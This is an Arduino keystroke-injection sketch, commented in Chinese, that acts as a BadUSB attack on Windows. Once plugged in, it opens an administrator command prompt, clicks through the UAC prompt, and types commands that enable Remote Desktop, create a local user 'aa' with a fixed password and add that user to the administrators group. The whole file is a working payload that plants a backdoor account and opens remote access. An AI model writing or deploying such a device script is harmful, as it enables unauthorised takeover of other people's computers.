/* Unverified code */

#include <Keyboard.h>

// 输入一行命令，自带回车
void sendCmd(const char* sequence, int delayTime = 500) {
  Keyboard.println(sequence);
  delay(delayTime);
}

// 按下一个键，然后释放，指定按住的时间、释放后延时的时间
void pressKey(int key, int pressTime = 0, int afterReleaseTime = 200) {
  Keyboard.press(key);
  delay(pressTime);
  Keyboard.releaseAll();
  delay(afterReleaseTime);
}

// 同时按下多个键，然后释放，指定按住的时间、释放后延时的时间
void pressKeys(int* keys, int size, int pressTime = 0, int afterReleaseTime = 200) {
  for (int i = 0; i < size; i++) {
    Keyboard.press(keys[i]);
    delay(pressTime);
  }
  Keyboard.releaseAll();
  delay(afterReleaseTime);
}

// 切换Caps Lock
void switchCapsLock() {
  pressKey(KEY_CAPS_LOCK, 200, 200);
}

// 主过程
void main_process() {
  // 打开运行对话框
  int keyList[] = {KEY_LEFT_GUI, 'r'};
  pressKeys(keyList, 2, 0, 1000);
  
  // 输入cmd
  Keyboard.print("cmd");  // println会多输入一个换行符
  delay(500);

  // Ctrl + Shift + Enter以管理员身份运行cmd
  int keyList2[] = {KEY_LEFT_CTRL, KEY_LEFT_SHIFT, KEY_RETURN};
  pressKeys(keyList2, 3, 0, 2000);

  // 确认用户账户控制通知，如果被关闭，下面的代码也不会起作用
  pressKey(KEY_LEFT_ARROW, 0, 200);  // 按下左键
  pressKey(KEY_RETURN, 0, 2000);  // 按下回车

  // 执行新的命令
  sendCmd("wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1", 10000);  // 设置允许远程桌面连接
  sendCmd("net user aa 114514 /add", 10000);  // 添加新用户
  sendCmd("net localgroup administrators aa /add", 10000);  // 将用户添加到管理员组
}

void setup() {
  Keyboard.begin();
  delay(1000);

  // 如果一开始 Caps Lock 就是关闭的，那么第一次执行主过程时会失败
  // 接下来再执行一遍，就能确保正常执行
  for (int i = 0; i < 2; i++) {
    switchCapsLock();
    main_process();
    // 为了确保执行成功，还需敲2下回车
    for (int j = 0; j < 2; j++)
    {
      pressKey(KEY_RETURN, 0, 200);
    }
  }

  Keyboard.end();
}

void loop() {
// put your main code here, to run repeatedly:
}
